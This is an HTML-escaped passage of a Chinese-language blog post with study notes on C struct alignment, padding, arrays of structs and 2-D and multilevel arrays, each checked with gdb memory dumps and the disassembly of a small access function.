punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;假设&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;figcaption data-lang=&#34;c&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;a &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0x0a&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;b &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0x0b0b&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;c &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0x0c0c0c0c&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;d &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0x0d0d0d0d0d0d0d0d&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;继续输入 &lt;code&gt;c&lt;/code&gt; ，我们使用 &lt;code&gt;x/32bx $rdi&lt;/code&gt;  来查看结构体内容，内容如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(gdb) x/32bx $rdi
0x6010e0 &amp;lt;increasing&amp;gt;:  0x0a    0x00    0x0b    0x0b    0x0c    0x0c    0x0c    0x0c
0x6010e8 &amp;lt;increasing+8&amp;gt;:        0x0d    0x0d    0x0d    0x0d    0x0d    0x0d    0x0d    0x0d
0x6010f0 &amp;lt;increasing+16&amp;gt;:       0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x6010f8 &amp;lt;increasing+24&amp;gt;:       0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;和我们料想的情况一致。&lt;/p&gt;
&lt;p&gt;将结构体内容重新排列如下：&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;figcaption data-lang=&#34;c&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;rearranged&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;char&lt;/span&gt; a&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;long&lt;/span&gt; b&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;short&lt;/span&gt; c&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; d&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;这种方法按理论来说应该比上面那种多用 8 个字节。结果验证如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(gdb) x/32bx rearranged
0x6010a0 &amp;lt;rearranged&amp;gt;:  0x0a    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x6010a8 &amp;lt;rearranged+8&amp;gt;:        0x0b    0x0b    0x0b    0x0b    0x0b    0x0b    0x0b    0x0b
0x6010b0 &amp;lt;rearranged+16&amp;gt;:       0x0c    0x0c    0x00    0x00    0x0d    0x0d    0x0d    0x0d
0x6010b8 &amp;lt;rearranged+24&amp;gt;:       0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;arrays-of-structs&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#arrays-of-structs&#34;&gt;#&lt;/a&gt; Arrays of Structs&lt;/h2&gt;
&lt;p&gt;有结构体如下：&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;figcaption data-lang=&#34;c&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;pair&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; large&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;char&lt;/span&gt; small&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;pair&lt;/span&gt; pairs &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt; xabababab &lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0x1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt; xcdcdcdcd &lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0x2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;每个 &lt;code&gt;pair&lt;/code&gt;  应该是 8 个字节。因为 &lt;code&gt;int&lt;/code&gt;  类型占 4 个字节， &lt;code&gt;char&lt;/code&gt;  类型占 1 个字节。&lt;strong&gt;此外结构体的长度必须是结构体中体积最大的类型的整数倍&lt;/strong&gt;，该结构体中最大的是 &lt;code&gt;int&lt;/code&gt;  类型，4 个字节，因此结构体的长度必须是 4 个字节的倍数，因此是 8 个字节，需要在 &lt;code&gt;char&lt;/code&gt;  后再加 3 个字节的 &lt;code&gt;padding&lt;/code&gt; 。 &lt;code&gt;pairs&lt;/code&gt;  是一个包含两个结构体变量的数组，1 个变量是 8 个字节，2 个就是 16 个字节。&lt;/p&gt;
&lt;p&gt;我们验证一下 (此处 &lt;code&gt;pairs&lt;/code&gt;  也可以替换成 &lt;code&gt;&amp;amp;pairs&lt;/code&gt; )：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(gdb) x/16bx pairs
0x601080 &amp;lt;pairs&amp;gt;:       0xab    0xab    0xab    0xab    0x01    0x00    0x00    0x00
0x601088 &amp;lt;pairs+8&amp;gt;:     0xcd    0xcd    0xcd    0xcd    0x02    0x00    0x00    0x00
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;此外，结构体中可以包含数组，此时 &lt;code&gt;结构体的alignment = max(数组中最大元素，结构体其他元素)&lt;/code&gt; 。例如：&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;figcaption data-lang=&#34;c&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;triple&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;short&lt;/span&gt; large &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;char&lt;/span&gt; small&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;其中 &lt;code&gt;short&lt;/code&gt;  类型 2 个字节， &lt;code&gt;char&lt;/code&gt;  类型 1 个字节。该结构体的长度 = 2 字节的整数倍。&lt;/p&gt;
&lt;h2 id=&#34;2-d-arrays&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2-d-arrays&#34;&gt;#&lt;/a&gt; 2-D Arrays&lt;/h2&gt;
&lt;p&gt;一个嵌套的数组如下：&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;figcaption data-lang=&#34;c&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token class-name&#34;&gt;int8_t&lt;/span&gt; nested &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;--&lt;/span&gt;swig￼&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;--&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;输入如下命令查看内存 &lt;code&gt;nested&lt;/code&gt;  处的值：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(gdb) x/6bx nested
0x601076 &amp;lt;nested&amp;gt;:      0x00    0x01    0x02    0x10    0x11    0x12
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;可以看到一个单元是 1 个字节，一共 6 个单元。数组元素按照行顺序排列。&lt;/p&gt;
&lt;p&gt;函数 &lt;code&gt;access&lt;/code&gt;  的 C 版本如下：&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;figcaption data-lang=&#34;c&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token class-name&#34;&gt;int8_t&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;access&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token class-name&#34;&gt;int8_t&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; arr&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;size_t&lt;/span&gt; row&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;size_t&lt;/span&gt; column&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; arr&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;row&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;column&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;仔细查了一下&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC8zMzU2OTM5MzM=&#34;&gt;资料&lt;/span&gt;，在 C 语言中这里有两种写法要注意一下区分：&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;figcaption data-lang=&#34;c&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;arr&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;// 定义一个指针 arr，指向一个包含 10 个元素的数组，arr 可以是 new int [n][3], 它可以是个二维数组&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; arr&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;// 定义一个包含 10 个元素的数组，其中每个元素都是一个 int 类型的指针，其起始地址为 arr&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;这样声明的原因是： &lt;code&gt;[]&lt;/code&gt;  运算符的优先级比 &lt;code&gt;*&lt;/code&gt;  高，因此需要通过 &lt;code&gt;()&lt;/code&gt;  来把 &lt;code&gt;*arr&lt;/code&gt;  括起来。&lt;/p&gt;
&lt;p&gt;由此， &lt;code&gt;access&lt;/code&gt;  函数的传入参数 &lt;code&gt;arr&lt;/code&gt;  是一个指针，该指针指向一个 3 个元素的数组。可以有 &lt;code&gt;n&lt;/code&gt;  个这样的指针，构成一个二维数组。如 &lt;code&gt;arr = new int[n][3]&lt;/code&gt; ，那么 &lt;code&gt;arr&lt;/code&gt;  有 n 行，每行都是一个指向三个元素的数组。这种表示不能用于第二维度（列）不等于 3 的数组，如 &lt;code&gt;int flipped [3][2]&lt;/code&gt; 。&lt;/p&gt;
&lt;p&gt;如果要将 C 语言版本的 &lt;code&gt;access&lt;/code&gt;  转化为汇编指令， &lt;code&gt;&amp;amp;arr[row][col] = arr + row * 3 + col&lt;/code&gt; （因为这里每个 &lt;code&gt;int&lt;/code&gt;  都是一个字节，因此不需要乘上多余的 &lt;code&gt;sizeof(T)&lt;/code&gt; ，否则就需要乘上 &lt;code&gt;sizeof(T)&lt;/code&gt; 。可以使用一个寄存器作为 &lt;code&gt;arr&lt;/code&gt; ，计算 &lt;code&gt;3 * row&lt;/code&gt; ，再加上 &lt;code&gt;col&lt;/code&gt; ，最后对指针解引，放到返回值中。&lt;/p&gt;
&lt;p&gt;对函数 &lt;code&gt;access&lt;/code&gt;  进行反汇编，得到如下指令：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(gdb) disassemble access
Dump of assembler code for function access:
   0x00000000004005b5 &amp;lt;+0&amp;gt;:     lea    (%rsi,%rsi,2),%rax ;; rax = 3 * rsi
   0x00000000004005b9 &amp;lt;+4&amp;gt;:     add    %rax,%rdi ;; rdi += 3 * rsi
   0x00000000004005bc &amp;lt;+7&amp;gt;:     movzbl (%rdi,%rdx,1),%eax ;; eax = *(rdi + 3 * rsi + rdx)
   0x00000000004005c0 &amp;lt;+11&amp;gt;:    retq
End of assembler dump.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这里我想 &lt;code&gt;%rdi&lt;/code&gt;  是 &lt;code&gt;arr&lt;/code&gt;  的基地址， &lt;code&gt;%rsi&lt;/code&gt;  是 &lt;code&gt;row&lt;/code&gt; ， &lt;code&gt;rdx&lt;/code&gt;  是 &lt;code&gt;col&lt;/code&gt; 。我们首先计算了 &lt;code&gt;3 * rsi&lt;/code&gt; ，将其加到 &lt;code&gt;%rdi&lt;/code&gt;  中，然后计算 &lt;code&gt;3 * %rsi + %rdx&lt;/code&gt; 。&lt;/p&gt;
&lt;p&gt;现在给 3 个数组：&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;figcaption data-lang=&#34;c&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token class-name&#34;&gt;int8_t&lt;/span&gt; first &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x00&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0x01&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0x02&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token class-name&#34;&gt;int8_t&lt;/span&gt; second &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x10&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0x11&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0x12&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token class-name&#34;&gt;int8_t&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; multilevel &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;first &lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; second &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;这里 &lt;code&gt;multilevel&lt;/code&gt;  是一个嵌套的数组，其第一个元素 &lt;code&gt;first&lt;/code&gt;  是一个 3 个字节的数组，其本身是个指针。第二个元素 &lt;code&gt;second&lt;/code&gt;  同理。&lt;br&gt;
 &lt;code&gt;multilevel&lt;/code&gt;  的每个元素是 8 个字节。数组的每个元素是 1 个字节。输入如下指令检验：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(gdb) x/2gx multilevel
0x601060 &amp;lt;multilevel&amp;gt;:  0x0000000000601073      0x0000000000601070
(gdb) x/3bx first
0x601073 &amp;lt;first&amp;gt;:       0x00    0x01    0x02
(gdb) x/3bx multilevel[0]
0x601073 &amp;lt;first&amp;gt;:       0x00    0x01    0x02
(gdb) p &amp;amp;first
$4 = (int8_t (*)[3]) 0x601073 &amp;lt;first&amp;gt;
(gdb) p &amp;amp;second
$5 = (int8_t (*)[3]) 0x601070 &amp;lt;second&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;将上述 C 语言程序换成如下程序：&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;figcaption data-lang=&#34;c&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token class-name&#34;&gt;int8_t&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;accessMultilevel&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token class-name&#34;&gt;int8_t&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;arr &lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;size_t&lt;/span&gt; row &lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;size_t&lt;/span&gt; column&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; arr&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;row&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;column&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;这里将 &lt;code&gt;int8_t (*arr)[3]&lt;/code&gt;  换成了 &lt;code&gt;int8_t **arr&lt;/code&gt; ，也就是说这个 &lt;code&gt;arr&lt;/code&gt;  可以指向一个二维数组，而这个二维数组的长和宽可以不定。&lt;br&gt;
